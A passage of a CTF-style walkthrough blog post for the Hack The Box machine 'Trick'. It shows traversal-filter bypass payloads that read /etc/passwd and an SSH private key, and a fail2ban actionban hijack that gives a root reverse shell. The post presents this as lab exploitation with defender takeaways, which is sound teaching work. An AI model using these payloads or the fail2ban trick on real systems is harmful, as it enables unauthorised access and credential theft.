+<h3 id="Bypassing-Directory-Traversal-Filters"><a href="#Bypassing-Directory-Traversal-Filters" class="headerlink" title="Bypassing Directory Traversal Filters"></a>Bypassing Directory Traversal Filters</h3><p>Initially, attempting standard <code>../</code> traversal results in a blank page, suggesting a filter removes <code>../</code> from the input. We can test this hypothesis by visiting:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://preprod-marketing.trick.htb/index.php?page=../about.html</span><br></pre></td></tr></table></figure>
+
+<p>The about page loads normally, confirming the filter. Testing further with:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://preprod-marketing.trick.htb/index.php?page=about.html../</span><br></pre></td></tr></table></figure>
+
+<p>Again, the page loads successfully, indicating <code>../</code> is being stripped from our input.</p>
+<h3 id="Filter-Bypass-Technique"><a href="#Filter-Bypass-Technique" class="headerlink" title="Filter Bypass Technique"></a>Filter Bypass Technique</h3><p>We can bypass this filter using <code>....//</code>. When the filter removes one <code>../</code>, it leaves the other intact. Testing:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>Success! The filter is bypassed.</p>
+<h3 id="Retrieving-SSH-Private-Key"><a href="#Retrieving-SSH-Private-Key" class="headerlink" title="Retrieving SSH Private Key"></a>Retrieving SSH Private Key</h3><p>With confirmed LFI and knowledge of user <code>michael</code>, we can attempt to read his SSH private key:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....///home/michael/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSH-Access"><a href="#SSH-Access" class="headerlink" title="SSH Access"></a>SSH Access</h3><p>With the private key retrieved, we can establish SSH access:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">panosoiko@parrot:~/Downloads$ chmod 600 id_rsa</span><br><span class="line"></span><br><span class="line">panosoiko@parrot:~/Downloads$ ssh -i id_rsa michael@10.129.100.122</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Sudo-Privileges"><a href="#Sudo-Privileges" class="headerlink" title="Sudo Privileges"></a>Sudo Privileges</h3><p>Checking sudo permissions:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">michael@trick:~$ sudo -l</span><br><span class="line">Matching Defaults entries for michael on trick:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User michael may run the following commands on trick:</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/fail2ban restart</span><br></pre></td></tr></table></figure>
+
+<p>User <code>michael</code> can restart fail2ban without a password. This is our privilege escalation vector.</p>
+<h3 id="Fail2ban-Exploitation"><a href="#Fail2ban-Exploitation" class="headerlink" title="Fail2ban Exploitation"></a>Fail2ban Exploitation</h3><p>The target file is <code>iptables-multiport.conf</code>, specifically the <code>actionban</code> variable which contains the command executed when a user is banned. While we don’t have write access to the file directly, the directory is owned by the <code>security</code> group, allowing us to move and replace files.</p>
+<p><strong>Steps to exploit:</strong></p>
+<ol>
+<li><strong>Backup and replace the configuration file:</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat iptables-multiport.conf</span><br><span class="line">mv iptables-multiport.conf .old</span><br><span class="line">cp .old iptables-multiport.conf</span><br><span class="line">ls -l iptables-multiport.conf</span><br></pre></td></tr></table></figure>
+
+<p>Now we have full control over <code>iptables-multiport.conf</code>.</p>
+<ol start="2">
+<li><strong>Modify the actionban variable:</strong></li>
+</ol>
+<p>Edit the configuration file and change the <code>actionban</code> variable to:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actionban = /tmp/shell.sh</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>Create the malicious shell script:</strong></li>
+</ol>
+<p>Create <code>/tmp/shell.sh</code> with your reverse shell payload and make it executable with <code>chmod +x /tmp/shell.sh</code>.</p>
+<ol start="4">
+<li><strong>Restart fail2ban:</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/fail2ban restart</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li><strong>Start a netcat listener:</strong></li>
+</ol>
+<p>On your attacking machine, start a listener to catch the reverse shell.</p>
+<ol start="6">
+<li><strong>Trigger the ban:</strong></li>
+</ol>
+<p>Attempt SSH login with incorrect credentials multiple times to trigger the ban action:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh michael@10.129.100.122</span><br></pre></td></tr></table></figure>
+
+<p>Hit enter several times with incorrect passwords.</p>
+<p>After a short period, fail2ban executes our malicious script, and we receive a root shell on our netcat listener.</p>
+<hr>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>The Trick HTB machine demonstrated several critical vulnerabilities commonly found in web applications:</p>
+<ol>
+<li><strong>DNS Zone Transfer</strong> - Allowed discovery of hidden subdomains</li>
+<li><strong>SQL Injection</strong> - Bypassed authentication and enabled file reading</li>
+<li><strong>Local File Inclusion</strong> - Exposed sensitive files including SSH keys</li>
+<li><strong>Filter Bypass</strong> - Circumvented directory traversal protections</li>
+<li><strong>Privilege Escalation via fail2ban</strong> - Misconfigured sudo permissions leading to root access</li>
+</ol>
+<p>This walkthrough emphasizes the importance of proper input validation, secure file handling, restrictive sudo configurations, and limiting DNS zone transfers in production environments.</p>
+<p><strong>Key Takeaways for Defenders:</strong></p>
+<ul>
+<li>Implement proper input validation and parameterized queries</li>
+<li>Restrict DNS zone transfers to authorized servers only</li>
+<li>Apply principle of least privilege for sudo permissions</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Trick-HTB-Writeup-Complete-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Trick HTB Writeup - Complete Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Results"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan Results</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-Enumeration"><span class="toc-number">1.2.2.</span> <span class="toc-text">DNS Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Application-Analysis"><span class="toc-number">1.3.</span> <span class="toc-text">Web Application Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Preprod-Payroll-Subdomain"><span class="toc-number">1.3.1.</span> <span class="toc-text">Preprod-Payroll Subdomain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-Vulnerability"><span class="toc-number">1.3.2.</span> <span class="toc-text">SQL Injection Vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Post-Authentication-Enumeration"><span class="toc-number">1.3.3.</span> <span class="toc-text">Post-Authentication Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-LFI"><span class="toc-number">1.4.</span> <span class="toc-text">Exploiting LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reading-PHP-Files"><span class="toc-number">1.4.1.</span> <span class="toc-text">Reading PHP Files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Database-Credentials-Discovered"><span class="toc-number">1.4.2.</span> <span class="toc-text">Database Credentials Discovered</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMap-Exploitation"><span class="toc-number">1.5.</span> <span class="toc-text">SQLMap Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Automated-SQL-Injection"><span class="toc-number">1.5.1.</span> <span class="toc-text">Automated SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Checking-Database-Privileges"><span class="toc-number">1.5.2.</span> <span class="toc-text">Checking Database Privileges</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reading-System-Files"><span class="toc-number">1.5.3.</span> <span class="toc-text">Reading System Files</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Additional-Subdomain-Discovery"><span class="toc-number">1.6.</span> <span class="toc-text">Additional Subdomain Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx-Configuration"><span class="toc-number">1.6.1.</span> <span class="toc-text">Nginx Configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Preprod-Marketing"><span class="toc-number">1.7.</span> <span class="toc-text">Exploiting Preprod-Marketing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI-Vulnerability-Discovery"><span class="toc-number">1.7.1.</span> <span class="toc-text">LFI Vulnerability Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypassing-Directory-Traversal-Filters"><span class="toc-number">1.7.2.</span> <span class="toc-text">Bypassing Directory Traversal Filters</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Filter-Bypass-Technique"><span class="toc-number">1.7.3.</span> <span class="toc-text">Filter Bypass Technique</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Retrieving-SSH-Private-Key"><span class="toc-number">1.7.4.</span> <span class="toc-text">Retrieving SSH Private Key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-Access"><span class="toc-number">1.7.5.</span> <span class="toc-text">SSH Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.8.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sudo-Privileges"><span class="toc-number">1.8.1.</span> <span class="toc-text">Sudo Privileges</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fail2ban-Exploitation"><span class="toc-number">1.8.2.</span> <span class="toc-text">Fail2ban Exploitation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.9.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/10/17/HTB-Trick/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/10/17/HTB-Trick/&text=HTB-Trick"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/10/17/HTB-Trick/&title=HTB-Trick"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/10/17/HTB-Trick/&is_video=false&description=HTB-Trick"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Trick&body=Check out this article: http://example.com/2025/10/17/HTB-Trick/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/10/17/HTB-Trick/&title=HTB-Trick"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/10/17/HTB-Trick/&title=HTB-Trick"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/10/17/HTB-Trick/&title=HTB-Trick"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/10/17/HTB-Trick/&title=HTB-Trick"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/10/17/HTB-Trick/&name=HTB-Trick&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/10/17/HTB-Trick/&t=HTB-Trick"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
